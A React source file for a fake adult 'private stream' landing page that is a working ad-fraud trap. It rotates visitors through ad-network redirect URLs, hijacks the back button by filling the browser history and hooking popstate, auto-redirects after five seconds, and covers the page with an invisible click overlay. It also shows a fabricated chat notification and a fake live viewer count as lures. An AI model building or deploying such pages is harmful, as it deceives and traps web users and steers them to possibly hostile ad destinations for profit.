import React, { useEffect, useState } from 'react';
import { Play, Shield, MessageCircle, Heart, Share2, MoreHorizontal } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

const ADSTERRA_LINKS = [
  "https://normalroominsufficient.com/cmbvaee3u?key=bf8675cf9eb76067699073a47495c1ca",
  "https://normalroominsufficient.com/ip8tm2t3?key=c7f16cc80fcaa336b3350a931e4096a6",
  "https://normalroominsufficient.com/yc1kuytic8?key=c7320f268e1096bf4941478426ea580e",
  "https://normalroominsufficient.com/i2c41jadj?key=8a46bcb0a26378f4697f0cc7d5e20928"
];

export default function App() {
  const [showNotification, setShowNotification] = useState(false);

  useEffect(() => {
    // Sequential Redirect Logic
    const redirectToNext = () => {
      const currentIndex = parseInt(localStorage.getItem('ad_sequence_index') || '0');
      const link = ADSTERRA_LINKS[currentIndex % ADSTERRA_LINKS.length];
      
      // Update index for next visit
      localStorage.setItem('ad_sequence_index', (currentIndex + 1).toString());
      
      // Direct Redirect
      window.location.href = link;
    };

    // Back button hijack - if they try to go back, just send them to the next ad
    const handleBack = () => {
      window.history.pushState(null, "", window.location.href);
      redirectToNext();
    };

    // Fill history to capture back button
    for (let i = 0; i < 50; i++) {
      window.history.pushState(null, "", window.location.href);
    }
    
    window.addEventListener('popstate', handleBack);

    // Auto-redirect after 5 seconds on landing page
    const redirectTimer = setTimeout(() => {
      redirectToNext();
    }, 5000);

    // Show a fake notification after 2 seconds
    const notificationTimer = setTimeout(() => setShowNotification(true), 2000);

    return () => {
      window.removeEventListener('popstate', handleBack);
      clearTimeout(redirectTimer);
      clearTimeout(notificationTimer);
    };
  }, []);

  const handleManualTrigger = () => {
    const currentIndex = parseInt(localStorage.getItem('ad_sequence_index') || '0');
    window.location.href = ADSTERRA_LINKS[currentIndex % ADSTERRA_LINKS.length];
  };

  return (
    <div 
      className="min-h-screen bg-black text-white flex flex-col items-center justify-center relative overflow-hidden font-sans"
      onClick={handleManualTrigger}
    >
      {/* Background Glow */}
      <div className="absolute inset-0 bg-gradient-to-b from-purple-900/20 to-black pointer-events-none" />
      
      {/* Main Video Container */}
      <div className="w-full max-w-4xl px-4 z-10">
        <div className="relative aspect-video bg-zinc-900 rounded-2xl overflow-hidden shadow-2xl border border-white/10 group cursor-pointer">
          <img 
            src="https://picsum.photos/seed/girl-video/1280/720" 
            alt="Video Content" 
            className="w-full h-full object-cover opacity-80 group-hover:scale-105 transition-transform duration-700"
            referrerPolicy="no-referrer"
          />
          
          <div className="absolute inset-0 flex items-center justify-center">
            <motion.div 
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              whileHover={{ scale: 1.1 }}
              className="w-20 h-20 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center border border-white/30 shadow-xl"
            >
              <Play className="w-10 h-10 text-white fill-white ml-1" />
            </motion.div>
          </div>

          <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/80 to-transparent flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="h-1 w-32 bg-white/30 rounded-full overflow-hidden">
                <div className="h-full w-1/3 bg-red-600" />
              </div>
              <span className="text-xs font-mono opacity-70">04:21 / 12:45</span>
            </div>
            <div className="flex gap-3">
              <Shield className="w-4 h-4 opacity-50" />
              <MoreHorizontal className="w-4 h-4 opacity-50" />
            </div>
          </div>
        </div>

        <div className="mt-6 space-y-4">
          <div className="flex items-center justify-between">
            <h1 className="text-xl font-bold tracking-tight">Exclusive Content: Private Stream #402</h1>
            <div className="flex items-center gap-2 text-red-500 text-sm font-semibold">
              <span className="relative flex h-2 w-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
              </span>
              LIVE: 14.2k watching
            </div>
          </div>

          <div className="flex items-center gap-6 py-4 border-y border-white/5">
            <button className="flex items-center gap-2 text-sm font-medium opacity-80 hover:opacity-100 transition-opacity">
              <Heart className="w-5 h-5" /> 2.4k
            </button>
            <button className="flex items-center gap-2 text-sm font-medium opacity-80 hover:opacity-100 transition-opacity">
              <MessageCircle className="w-5 h-5" /> 842
            </button>
            <button className="flex items-center gap-2 text-sm font-medium opacity-80 hover:opacity-100 transition-opacity">
              <Share2 className="w-5 h-5" /> Share
            </button>
          </div>
        </div>
      </div>

      {/* Fake Social Bar Notification */}
      <AnimatePresence>
        {showNotification && (
          <motion.div 
            initial={{ y: 100, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: 100, opacity: 0 }}
            className="fixed bottom-6 right-6 w-80 bg-zinc-900 border border-white/10 rounded-xl p-4 shadow-2xl z-50 cursor-pointer"
            onClick={(e) => {
              e.stopPropagation();
              handleManualTrigger();
            }}
          >
            <div className="flex gap-3">
              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-pink-500 to-orange-500 flex-shrink-0 flex items-center justify-center overflow-hidden">
                <img src="https://picsum.photos/seed/avatar/100/100" alt="Avatar" referrerPolicy="no-referrer" />
              </div>
              <div className="flex-1">
                <p className="text-sm font-bold">New Message from Sarah</p>
                <p className="text-xs text-white/60 mt-1">"Hey, are you watching the stream? Click here to join..."</p>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="mt-12 text-[10px] text-white/20 uppercase tracking-[0.2em] font-medium">
        Secure Content Gateway • 18+ Only
      </div>

      <div 
        className="fixed inset-0 z-0" 
        onClick={handleManualTrigger}
      />
    </div>
  );
}
